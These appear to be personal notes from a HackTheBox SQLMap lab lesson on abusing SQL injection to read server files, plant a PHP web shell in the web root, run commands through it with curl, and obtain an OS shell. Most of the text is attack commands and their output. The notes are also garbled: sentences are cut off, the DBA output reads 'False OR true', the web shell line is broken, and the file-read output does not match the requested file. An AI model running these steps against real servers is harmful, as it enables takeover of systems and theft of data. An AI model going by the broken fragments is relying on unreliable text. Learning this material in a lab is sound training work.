
SQL Injection to read and write files from the local system outside the DBMS. SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.

## File Read/Write
Reading data is much more common than writing data, which is strictly privileged in modern DBMSes, as it can lead to system exploitation, as we will see. 
>For example, in MySql, to read local files, the DB user must have the privilege to `LOAD DATA` and `INSERT`, to be able to load the content of a file to a table and then reading that table.

- `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`

>While we do not necessarily need to have database administrator privileges (DBA) to read data, this is becoming more common in modern DBMSes.
 we do have DBA privileges, then it is much more probable that we have file-read privileges.

## Checking for DBA Privileges
```bash
AhmaDb0x@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```
```shell-session
current user is DBA: False OR true
```

## Reading Local Files
```bash
AhmaDb0x@htb[/htb]$ sqlmap -u "http://94.237.51.163:40834/?id=1" --file-read "/var/www/html/flag.txt"

```
```shell-session
files saved to [1]:
[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)
```

```shell-session
AhmaDb0x@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
```


## Writing Local Files
much more restricted in modern DMBSes, since we can utilize this to write a Web Shell on the remote server, and hence get code execution and take over the server.


>This is why modern DBMSes disable file-write by default and need certain privileges for DBA's to be able to write files. For example, in MySql, the `--secure-file-priv` configuration must be manually disabled to allow writing data into local files using the `INTO OUTFILE` SQL query,

many web applications require the ability for DBMSes to write data into files, so it is worth testing whether we can write files to the remote server. To do that with SQLMap, we can use the `--file-write` and `--file-dest` options


```bash
AhmaDb0x@htb[/htb]$ echo '<?($_GET["cmd"]); ?>' > shell.php
```

>``/var/www/html/` directory, the default server webroot for Apache`

```bash
AhmaDb0x@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
The flag is in a very common directory!

```bash
AhmaDb0x@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la
```

---
## OS Command Execution
`xp_cmdshell` in Microsoft SQL Server. To get an OS shell with SQLMap, we can use the `--os-shell` option, as follows:

```bash
AhmaDb0x@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
```
We see that SQLMap defaulted to `UNION` technique to get an OS shell, but eventually failed to give us any output `No output`


>direct output, like the `Error-based SQL Injection`, which we can specify with `--technique=E`:
```bash
AhmaDb0x@htb[/htb]$ sqlmap -u "http://94.237.51.163:40834/?id=1" --os-shell --technique=E --batch
```
```shell-session
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
```
```shell-session
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1
```
Note: SQLMap first asked us for the type of language used on this remote server, which we know is PHP. Then it asked us for the server web root directory, and we asked SQLMap to automatically find it using 'common location(s)'. Both of these options are the default options, and would have been automatically chosen if we added the '--batch' option to SQLMap.

---

common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www') (default)



# skill assessment
Similarly, when inspecting the Send Message button, the formâ€™s action is also set to #, indicating no data is posted to the server, so this page is not vulnerable
`sqlmap -r req.txt --threads 10 --tamper=between -T final_flag --dump --batch`






